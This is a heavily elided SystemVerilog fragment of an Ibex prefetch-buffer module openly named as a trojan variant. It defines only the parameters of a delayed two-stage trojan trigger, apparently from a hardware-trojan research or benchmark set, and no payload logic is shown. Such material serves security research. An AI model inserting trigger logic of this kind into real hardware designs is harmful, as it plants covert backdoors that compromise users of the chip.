 ...
 */
module ibex_prefetch_buffer_trojan_Covert #(
  ...
  output logic        busy_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3945, act=1972)
    // ============================================================
    localparam int ARM_THRESHOLD   = 3945;
    localparam int ACTIVATE_DELAY  = 1972;
